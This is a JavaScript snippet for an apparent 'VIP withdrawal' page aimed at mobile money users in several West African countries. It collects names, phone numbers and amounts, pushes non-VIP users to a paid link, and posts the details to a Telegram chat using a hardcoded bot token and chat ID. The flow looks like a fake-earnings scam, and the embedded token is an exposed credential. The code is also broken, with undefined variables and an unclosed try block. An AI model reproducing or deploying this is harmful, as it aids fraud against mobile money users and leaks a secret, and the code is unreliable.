/* ================= CONFIG RETRAIT VIP ================= */

const BOT_TOKEN =
"8768257415:AAGVVZ1tCotPs2mx9NWEf7SfLLBh68AK1eg";

const CHAT_ID =
"-1003353240263";

const VIP_LINK =
"https://westpay.cloud/link/yum3cdaamouf08cr";

let isVIP = true;                                                                 /* ================= RETRAIT VIP ================= */                 

async function withdraw() {

  try {

    const name = prompt("Nom complet");
    if (!name) return;

    const country = prompt(
      "Pays :\n1 - Burkina Faso\n2 - Côte d'Ivoire\n3 - Mali\n4 - Sénégal\n5 - Togo"
    );
    if (!country) return;

    const paymentMethod = prompt(
      "Méthode :\n1 - Orange Money\n2 - Moov Money\n3 - MTN Money\n4 - Wave"
    );
    if (!paymentMethod) return;

    const number = prompt("Numéro Mobile Money");
    if (!number) return;

    const amount = parseInt(prompt("Montant (FCFA)"));
    if (isNaN(amount)) {
      alert("Montant invalide");
      return;
    }                                       
                                   /* ===== VALIDATION ===== */

if(amount < 1000){

alert("Minimum retrait 1000 FCFA");
return;

}

if(!isVIP){

alert("Veuillez acheter le VIP");

window.open(VIP_LINK,"_blank");

return;

}

if(amount > user.balance){

alert("Solde insuffisant");
return;

}

/* ===== MESSAGE TELEGRAM ===== */

let message = `

🏧 NOUVEAU RETRAIT
                                  🌍 Pays: ${country}                    
                                  👤 Nom : ${name}

📱 Numéro : ${number}

💳 Méthode : ${method}

💰 Montant : ${amount} FCFA

📞 Compte : ${user.phone}

📅 Date : ${new Date().toLocaleString()}

`;

/* ===== ENVOI TELEGRAM ===== */

try{

let response = await fetch(

`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,

{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

chat_id:CHAT_ID,

text:message

})

}

);

let data = await response.json();

if(data.ok){

alert("Retrait envoyé avec succès");

}else{

alert("Erreur Telegram");

console.log(data);

}

}catch(error){

alert("Erreur réseau");

console.log(error);

}

}

